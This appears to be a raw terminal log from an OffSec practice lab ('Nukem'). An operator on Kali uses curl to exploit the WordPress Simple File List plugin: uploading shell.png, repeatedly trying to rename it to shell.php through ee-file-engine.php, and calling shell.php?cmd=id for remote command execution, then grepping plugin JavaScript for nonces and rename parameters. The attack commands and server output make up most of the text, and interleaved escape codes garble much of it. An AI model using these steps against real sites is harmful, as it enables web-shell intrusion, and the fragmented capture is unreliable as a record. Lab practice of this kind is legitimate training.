+  -F "eeSFL_Token=ba288252629a5399759b6fde1e205bc2"[K[5A[32mc[32mu[32mr[32ml[39m[12C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mp[33ml[33mu[33mg[33mi[33mn[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33me[33me[33m-[33mu[33mp[33ml[33mo[33ma[33md[33m-[33me[33mn[33mg[33mi[33mn[33me[33m.[33mp[33mh[33mp[33m"[39m[1B[131D[33m"[33mf[33mi[33ml[33me[33m=[33m@[33me[33mx[33mp[33ml[33mo[33mi[33mt[33ms[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mn[33mg[33m;[33mt[33my[33mp[33me[33m=[33mi[33mm[33ma[33mg[33me[33m/[33mp[33mn[33mg[33m"[39m[1B[41D[33m"[33me[33me[33mS[33mF[33mL[33m_[33mI[33mD[33m=[33m1[33m"[39m[1B[12D[33m"[33me[33me[33mS[33mF[33mL[33m_[33mF[33mi[33ml[33me[33mU[33mp[33ml[33mo[33ma[33md[33mD[33mi[33mr[33m=[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mu[33mp[33ml[33mo[33ma[33md[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33m"[39m[1B[59D[33m"[33me[33me[33mS[33mF[33mL[33m_[33mT[33mi[33mm[33me[33ms[33mt[33ma[33mm[33mp[33m=[33m1[33m5[33m8[33m7[33m2[33m5[33m8[33m8[33m8[33m5[33m"[39m[1B[28D[33m"[33me[33me[33mS[33mF[33mL[33m_[33mT[33mo[33mk[33me[33mn[33m=[33mb[33ma[33m2[33m8[33m8[33m2[33m5[33m2[33m6[33m2[33m9[33ma[33m5[33m3[33m9[33m9[33m7[33m5[33m9[33mb[33m6[33mf[33md[33me[33m1[33me[33m2[33m0[33m5[33mb[33mc[33m2[33m"[39m[?1l>[?2004l
+SUCCESS[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:44:39][39m $ [K[?1h=[?2004hcurl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-file-engine.php" \
+  -d "eeFileAction=Rename%7Cshell.php&eeListID=1&eeCurrentFilePath=%2Fwp-content%2Fuploads%2Fsimple-file-list%2F&eeFilename=shell.png"[K[A[86D[32mc[32mu[32mr[32ml[39m[12C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mp[33ml[33mu[33mg[33mi[33mn[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33me[33me[33m-[33mf[33mi[33ml[33me[33m-[33me[33mn[33mg[33mi[33mn[33me[33m.[33mp[33mh[33mp[33m"[39m[1B[129D[33m"[33me[33me[33mF[33mi[33ml[33me[33mA[33mc[33mt[33mi[33mo[33mn[33m=[33mR[33me[33mn[33ma[33mm[33me[33m%[33m7[33mC[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mh[33mp[33m&[33me[33me[33mL[33mi[33ms[33mt[33mI[33mD[33m=[33m1[33m&[33me[33me[33mC[33mu[33mr[33mr[33me[33mn[33mt[33
+$ [15:45:08] curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-file-engine.php" \
+  -d "eeFileAction=Rename%7Cshell.php&eeListID=1&eeCurrentFilePath=%2Fwp-content%2Fuploads%2Fsimple-file-list%2F&eeFilename=shell.png"
+
+$ [15:47:19] curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php?cmd=id"
+
+$ [15:48:10] curl -s -o /dev/null -w "%{http_code}" "http://$BoxIP/wp-content/uploads/simple-file-list/shell.png"
+mF[33mi[33ml[33me[33mP[33ma[33mt[33mh[33m=[33m%[33m2[33mF[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m%[33m2[33mF[33mu[33mp[33ml[33mo[33ma[33md[33ms[33m%[33m2[33mF[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m%[33m2[33mF[33m&[33me[33me[33mF[33mi[33ml[33me[33mn[33ma[33mm[33me[33m=[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mn[33mg[33m"[39m[?1l>[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:45:08][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php?cmd=id"[76D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mu[33mp[33ml[33mo[33ma[33md[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mh[33mp[33m?[33mc[33mm[33md[33m=[33mi[33md[33m"[39m[?1l>[?2004l
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<title>Object not found!</title>
+<link rev="made" href="mailto:you@example.com" />
+<style type="text/css"><!--/*--><![CDATA[/*><!--*/ 
+    body { color: #000000; background-color: #FFFFFF; }
+    a:link { color: #0000CC; }
+    p, address {margin-left: 3em;}
+    span {font-size: smaller;}
+/*]]>*/--></style>
+</head>
+
+<body>
+<h1>Object not found!</h1>
+<p>
+
+
+    The requested URL was not found on this server.
+
+  
+
+    If you entered the URL manually please check your
+    spelling and try again.
+
+  
+
+</p>
+<p>
+If you think this is a server error, please contact
+the <a href="mailto:you@example.com">webmaster</a>.
+
+</p>
+
+<h2>Error 404</h2>
+<address>
+  <a href="/">192.168.183.105</a><br />
+  <span>Apache/2.4.46 (Unix) PHP/7.4.10</span>
+</address>
+</body>
+</html>
+
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:47:19][39m $ [K[?1h=[?2004hcurl -s -o /dev/null -w "%{http_code}" "http://$BoxIP/wp-content/uploads/simple-file-list/shell.png"[100D[32mc[32mu[32mr[32ml[39m[7C[4m/[4md[4me[4mv[4m/[4mn[4mu[4ml[4ml[24m[4C[33m"[33m%[33m{[33mh[33mt[33mt[33mp[33m_[33mc[33mo[33md[33me[33m}[33m"[39m [33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mu[33mp[33ml[33mo[33ma[33md[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mn[33mg[33m"[39m[?1l>[?2004l
+200[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:48:10][39m $ [K[?1h=[?2004hcurl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-file-engine.php" \
+  -d "eeFileAction=Rename|shell.php&eeSFL_ID=1&eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/&eeFile=shell.png"[K[A[74D[32m
+$ [15:48:54] curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-file-engine.php" \
+  -d "eeFileAction=Rename|shell.php&eeSFL_ID=1&eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/&eeFile=shell.png"
+c[32mu[32mr[32ml[39m[12C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mp[33ml[33mu[33mg[33mi[33mn[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33me[33me[33m-[33mf[33mi[33ml[33me[33m-[33me[33mn[33mg[33mi[33mn[33me[33m.[33mp[33mh[33mp[33m"[39m[1B[129D[33m"[33me[33me[33mF[33mi[33ml[33me[33mA[33mc[33mt[33mi[33mo[33mn[33m=[33mR[33me[33mn[33ma[33mm[33me[33m|[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mh[33mp[33m&[33me[33me[33mS[33mF[33mL[33m_[33mI[33mD[33m=[33m1[33m&[33me[33me[33mS[33mF[33mL[33m_[33mF[33mi[33ml[33me[33mU[33mp[33ml[33mo[33ma[33md[33mD[33mi[33mr[33m=[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mu[33mp[33ml[33mo[33ma[33md[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33m&[33me[33me[33mF[33mi[33ml[33me[33m=[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mn[33mg[33m"[39m[?1l>[?2004l
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<meta name="viewport" content="width=device-width">
+		<meta name='robots' content='noindex,nofollow' />
+	<title>WordPress &rsaquo; Error</title>
+	<style type="text/css">
+		html {
+			background: #f1f1f1;
+		}
+		body {
+			background: #fff;
+			color: #444;
+			font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+			margin: 2em auto;
+			padding: 1em 2em;
+			max-width: 700px;
+			-webkit-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.13);
+			box-shadow: 0 1px 3px rgba(0, 0, 0, 0.13);
+		}
+		h1 {
+			border-bottom: 1px solid #dadada;
+			clear: both;
+			color: #666;
+			font-size: 24px;
+			margin: 30px 0 0 0;
+			padding: 0;
+			padding-bottom: 7px;
+		}
+		#error-page {
+			margin-top: 50px;
+		}
+		#error-page p,
+		#error-page .wp-die-message {
+			font-size: 14px;
+			line-height: 1.5;
+			margin: 25px 0 20px;
+		}
+		#error-page code {
+			font-family: Consolas, Monaco, monospace;
+		}
+		ul li {
+			margin-bottom: 10px;
+			font-size: 14px ;
+		}
+		a {
+			color: #0073aa;
+		}
+		a:hover,
+		a:active {
+			color: #006799;
+		}
+		a:focus {
+			color: #124964;
+			-webkit-box-shadow:
+				0 0 0 1px #5b9dd9,
+				0 0 2px 1px rgba(30, 140, 190, 0.8);
+			box-shadow:
+				0 0 0 1px #5b9dd9,
+				0 0 2px 1px rgba(30, 140, 190, 0.8);
+			outline: none;
+		}
+		.button {
+			background: #f7f7f7;
+			border: 1px solid #ccc;
+			color: #555;
+			display: inline-block;
+			text-decoration: none;
+			font-size: 13px;
+			line-height: 2;
+			height: 28px;
+			margin: 0;
+			padding: 0 10px 1px;
+			cursor: pointer;
+			-webkit-border-radius: 3px;
+			-webkit-appearance: none;
+			border-radius: 3px;
+			white-space: nowrap;
+			-webkit-box-sizing: border-box;
+			-moz-box-sizing:    border-box;
+			box-sizing:         border-box;
+
+			-webkit-box-shadow: 0 1px 0 #ccc;
+			box-shadow: 0 1px 0 #ccc;
+			vertical-align: top;
+		}
+
+		.button.button-large {
+			height: 30px;
+			line-height: 2.15384615;
+			padding: 0 12px 2px;
+		}
+
+		.button:hover,
+		.button:focus {
+			background: #fafafa;
+			border-color: #999;
+			color: #23282d;
+		}
+
+		.button:focus {
+			border-color: #5b9dd9;
+			-webkit-box-shadow: 0 0 3px rgba(0, 115, 170, 0.8);
+			box-shadow: 0 0 3px rgba(0, 115, 170, 0.8);
+			outline: none;
+		}
+
+		.button:active {
+			background: #eee;
+			border-color: #999;
+			-webkit-box-shadow: inset 0 2px 5px -3px rgba(0, 0, 0, 0.5);
+			box-shadow: inset 0 2px 5px -3px rgba(0, 0, 0, 0.5);
+		}
+
+			</style>
+</head>
+<body id="error-page">
+	<div class="wp-die-message"><p>There has been a critical error on your website.</p><p><a href="https://wordpress.org/support/article/debugging-in-wordpress/">Learn more about debugging in WordPress.</a></p></div>
+$ [15:49:40] curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-file-engine.php" \
+  -d "oldFile=shell.png&newFile=shell.php"
+
+$ [15:50:21] curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php?cmd=id"
+</body>
+</html>
+	[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:48:55][39m $ [K[?1h=[?2004hcurl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-file-engine.php" \
+  -d "oldFile=shell.png&newFile=shell.php"[K[A[6C[32mc[32mu[32mr[32ml[39m[12C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mp[33ml[33mu[33mg[33mi[33mn[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33me[33me[33m-[33mf[33mi[33ml[33me[33m-[33me[33mn[33mg[33mi[33mn[33me[33m.[33mp[33mh[33mp[33m"[39m[1B[129D[33m"[33mo[33ml[33md[33mF[33mi[33ml[33me[33m=[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mn[33mg[33m&[33mn[33me[33mw[33mF[33mi[33ml[33me[33m=[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mh[33mp[33m"[39m[?1l>[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:49:40][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php?cmd=id"[76D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mu[33mp[33ml[33mo[33ma[33md[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mh[33mp[33m?[33mc[33mm[33md[33m=[33mi[33md[33m"[39m[?1l>[?2004l
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<title>Object not found!</title>
+<link rev="made" href="mailto:you@example.com" />
+<style type="text/css"><!--/*--><![CDATA[/*><!--*/ 
+    body { color: #000000; background-color: #FFFFFF; }
+    a:link { color: #0000CC; }
+    p, address {margin-left: 3em;}
+    span {font-size: smaller;}
+/*]]>*/--></style>
+</head>
+
+<body>
+<h1>Object not found!</h1>
+<p>
+
+
+    The requested URL was not found on this server.
+
+  
+
+    If you entered the URL manually please check your
+    spelling and try again.
+
+  
+
+</p>
+<p>
+If you think this is a server error, please contact
+the <a href="mailto:you@example.com">webmaster</a>.
+
+</p>
+
+<h2>Error 404</h2>
+<address>
+  <a href="/">192.168.183.105</a><br />
+  <span>Apache/2.4.46 (Unix) PHP/7.4.10</span>
+</address>
+</body>
+</html>
+
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:50:21][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/" | grep -oP 'href="[^"]*"' | grep -v "js\|css\|png\|jpg\|#" | head -20[94D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33m"[39m[3C[32mg[32mr[32me[32mp[39m[5C[33m'[33mh[33mr[33me[33mf[33m=[33m"[33m[[33m^[33m"[33m][33m*[33m"[33m'[39m[3C[32mg[32mr[32me[32mp[39m[4C[33m"[33mj[33ms[33m\[33m|[33mc[33ms[33ms[33m\[33m|[33mp[33mn[33mg[33m\[33m|[33mj[33mp
+$ [15:51:44] curl -s "http://$BoxIP/" | grep -oP 'href="[^"]*"' | grep -v "js\|css\|png\|jpg\|#" | head -20
+
+$ [15:52:08] curl -s "http://$BoxIP/index.php/sample-page/" | grep -i "eeSFL\|token\|nonce\|upload\|simple-file"
+[33mg[33m\[33m|[33m#[33m"[39m[3C[32mh[32me[32ma[32md[39m[4C[?1l>[?2004l
+href="http://gmpg.org/xfn/11"
+href="/index.php/feed/"
+href="/index.php/comments/feed/"
+href="/xmlrpc.php?rsd"
+href="/wp-includes/wlwmanifest.xml"
+href="/"
+href="/"
+href="javascript:void(0)"
+href="/index.php/dashboard/"
+href="/index.php/instructor-registration/"
+href="/index.php/sample-page/"
+href="/index.php/student-registration/"
+href="javascript:void(0);"
+href="/index.php/2020/09/28/hello-world/"
+href="/index.php/2020/09/28/hello-world/"
+href="/index.php/2020/09/28/hello-world/"
+href="/index.php/author/admin/"
+href="/index.php/2020/09/28/hello-world/"
+href="/index.php/2020/09/28/hello-world/"
+href="/index.php/category/uncategorized/"
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:51:45][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/index.php/sample-page/" | grep -i "eeSFL\|token\|nonce\|upload\|simple-file"[99D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mi[33mn[33md[33me[33mx[33m.[33mp[33mh[33mp[33m/[33ms[33ma[33mm[33mp[33ml[33me[33m-[33mp[33ma[33mg[33me[33m/[33m"[39m[3C[32mg[32mr[32me[32mp[39m[4C[33m"[33me[33me[33mS[33mF[33mL[33m\[33m|[33mt[33mo[33mk[33me[33mn[33m\[33m|[33mn[33mo[33mn[33mc[33me[33m\[33m|[33mu[33mp[33ml[33mo[33ma[33md[33m\[33m|[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m"[39m[?1l>[?2004l
+<link rel='stylesheet' id='ee-simple-file-list-css-css'  href='/wp-content/plugins/simple-file-list/css/eeStyles.css?ver=5' type='text/css' media='all' />
+<script type='text/javascript' src='/wp-content/plugins/simple-file-list/js/ee-head.js?ver=5' id='ee-simple-file-list-js-head-js'></script>
+<script type='text/javascript' src='/wp-content/plugins/simple-file-list/js/ee-footer.js?ver=5' id='ee-simple-file-list-js-foot-js'></script>
+var _tutorobject = {"ajaxurl":"\/wp-admin\/admin-ajax.php","nonce_key":"_wpnonce","_wpnonce":"d7efb567e6","options":{"pagination_per_page":"20","load_tutor_css":"1","load_tutor_js":"1","course_allow_upload_private_files":"1","display_course_instructors":"1","enable_q_and_a_on_course":"1","courses_col_per_row":"3","courses_per_page":"3","lesson_permalink_base":"lesson","quiz_time_limit":{"value":"0","time":"minutes"},"quiz_when_time_expires":"autosubmit","quiz_attempts_allowed":"10","quiz_grade_method":"highest_grade","enable_public_profile":"1","email_to_students":{"quiz_completed":"1","completed_course":"1"},"email_to_instructors":{"a_student_enrolled_in_course":"1","a_student_completed_course":"1","a_student_completed_lesson":"1","a_student_placed_question":"1"},"email_from_name":"Retro Gamming","email_from_address":"admin@local.host","email_footer_text":"","tutor_dashboard_page_id":5,"student_register_page":6,"instructor_register_page":7},"placeholder_img_src":"\/wp-content\/plugins\/tutor\/assets\/images\/placeholder.jpg","enable_lesson_classic_editor":"","text":{"assignment_text_validation_msg":"Assignment answer can not be empty"}};
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:52:08][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/index.php/sample-page/" | grep -A5 "eeSFL\|eeListID\|eeToken"[84D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mi[33mn[33md[33me[33mx[33m.[33mp[33mh[33mp[33m/[33ms[33ma[33mm[33mp[33
+$ [15:52:29] curl -s "http://$BoxIP/index.php/sample-page/" | grep -A5 "eeSFL\|eeListID\|eeToken"
+
+$ [15:52:49] curl -s "http://$BoxIP/index.php/sample-page/" | grep -i "ee-\|data-\|eeSFL" | head -30
+
+$ [15:53:12] curl -s "http://$BoxIP/wp-content/plugins/simple-file-list/js/ee-footer.js" | grep -i "token\|nonce\|eeSFL\|listID" | head -20
+ml[33me[33m-[33mp[33ma[33mg[33me[33m/[33m"[39m[3C[32mg[32mr[32me[32mp[39m[5C[33m"[33me[33me[33mS[33mF[33mL[33m\[33m|[33me[33me[33mL[33mi[33ms[33mt[33mI[33mD[33m\[33m|[33me[33me[33mT[33mo[33mk[33me[33mn[33m"[39m[?1l>[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:52:29][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/index.php/sample-page/" | grep -i "ee-\|data-\|eeSFL" | head -30[87D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mi[33mn[33md[33me[33mx[33m.[33mp[33mh[33mp[33m/[33ms[33ma[33mm[33mp[33ml[33me[33m-[33mp[33ma[33mg[33me[33m/[33m"[39m[3C[32mg[32mr[32me[32mp[39m[4C[33m"[33me[33me[33m-[33m\[33m|[33md[33ma[33mt[33ma[33m-[33m\[33m|[33me[33me[33mS[33mF[33mL[33m"[39m[3C[32mh[32me[32ma[32md[39m[4C[?1l>[?2004l
+<link rel='stylesheet' id='ee-simple-file-list-css-css'  href='/wp-content/plugins/simple-file-list/css/eeStyles.css?ver=5' type='text/css' media='all' />
+<script type='text/javascript' src='/wp-content/plugins/simple-file-list/js/ee-head.js?ver=5' id='ee-simple-file-list-js-head-js'></script>
+<script type='text/javascript' src='/wp-content/plugins/simple-file-list/js/ee-footer.js?ver=5' id='ee-simple-file-list-js-foot-js'></script>
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:52:51][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/wp-content/plugins/simple-file-list/js/ee-footer.js" | grep -i "token\|nonce\|eeSFL\|listID" | head -20[126D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mp[33ml[33mu[33mg[33mi[33mn[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33mj[33ms[33m/[33me[33me[33m-[33mf[33mo[33mo[33mt[33me[33mr[33m.[33mj[33ms[33m"[39m[3C[32mg[32mr[32me[32mp[39m[4C[33m"[33mt[33mo[33mk[33me[33mn[33m\[33m|[33mn[33mo[33mn[33mc[33me[33m\[33m|[33me[33me[33mS[33mF[33mL[33m\[33m|[33ml[33mi[33ms[33mt[33mI[33mD[33m"[39m[3C[32mh[32me[32ma[32md[39m[4C[?1l>[?2004l
+	console.log('eeSFL Document Ready');
+		eeSFL_isTouchscreen = true;
+function eeSFL_EditFile(eeSFL_FileID) {
+	if( jQuery('#eeSFL_EditFileWrap_' + eeSFL_FileID).is(':visible') ) {
+		jQuery('#eeSFL_EditFileWrap_' + eeSFL_FileID).slideUp();
+		jQuery('#eeSFL_EditFile_' + eeSFL_FileID).text('Edit');
+		jQuery('#eeSFL_EditFileWrap_' + eeSFL_FileID).slideDown();
+		jQuery('#eeSFL_EditFile_' + eeSFL_FileID).text('Cancel');
+function eeSFL_EditSave(eeSFL_FileID) {
+	var eeName1 = jQuery('#eeSFL_RowID-' + eeSFL_FileID + ' p.eeSFL_FileLink').text(); // Current File Name
+	var eeName2 = jQuery('#eeSFL_RowID-' + eeSFL_FileID + ' input.eeNewFileName').val(); // New File Name
+		eeSFL_FileAction(eeSFL_FileID, 'Rename');
+	var eeDesc1 = jQuery('#eeSFL_RowID-' + eeSFL_FileID + ' span.eeSFL_SavedDesc').text(); // Current Desc
+	var eeDesc2 = jQuery('#eeSFL_RowID-' + eeSFL_FileID + ' input.eeSFL_NewFileDesc').val(); // New Desc
+		eeSFL_FileAction(eeSFL_FileID, 'UpdateDesc');
+	jQuery('#eeSFL_EditFileWrap_' + eeSFL_FileID).slideUp();
+	jQuery('#eeSFL_EditFile_' + eeSFL_FileID).text('Edit');
+function eeSFL_Delete(eeSFL_FileID) {
+	console.log('Deleting File ID #' + eeSFL_FileID);
+    var eeSFL_FileName = j
+$ [15:53:30] curl -s "http://$BoxIP/wp-content/plugins/simple-file-list/js/ee-footer.js" | grep -A20 "function eeSFL_FileAction"
+
+$ [15:53:48] curl -s "http://$BoxIP/wp-content/plugins/simple-file-list/js/ee-footer.js" | grep -A60 "function eeSFL_FileAction"
+Query('#eeSFL_RowID-' + eeSFL_FileID + ' .eeSFL_RealFileName').text();
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:53:12][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/wp-content/plugins/simple-file-list/js/ee-footer.js" | grep -A20 "function eeSFL_FileAction"[115D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mp[33ml[33mu[33mg[33mi[33mn[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33mj[33ms[33m/[33me[33me[33m-[33mf[33mo[33mo[33mt[33me[33mr[33m.[33mj[33ms[33m"[39m[3C[32mg[32mr[32me[32mp[39m[6C[33m"[33mf[33mu[33mn[33mc[33mt[33mi[33mo[33mn[33m [33me[33me[33mS[33mF[33mL[33m_[33mF[33mi[33ml[33me[33mA[33mc[33mt[33mi[33mo[33mn[33m"[39m[?1l>[?2004l
+function eeSFL_FileAction(eeSFL_FileID, eeSFL_Action) {
+	
+	event.preventDefault(); // Don't follow link
+	
+	console.log(eeSFL_Action + ' -> ' + eeSFL_FileID);
+	
+	// The File Action Engine
+	var eeActionEngine = eeSFL_PluginURL + 'ee-file-engine.php';
+	
+	
+	// AJAX --------------
+	
+	// Get the Nonce
+	var eeSFL_ActionNonce = jQuery('#eeSFL_ActionNonce').text();
+	
+	if(eeSFL_Action == 'Rename') {
+		
+		var eeSFL_OldFileName = jQuery('#eeSFL_RowID-' + eeSFL_FileID + ' span.eeSFL_RealFileName').text(); // Current File Name
+		var eeSFL_NewFileName = jQuery('#eeSFL_RowID-' + eeSFL_FileID + ' input.eeNewFileName').val();
+		
+		// Sanitize to match reality
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:53:30][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/wp-content/plugins/simple-file-list/js/ee-footer.js" | grep -A60 "function 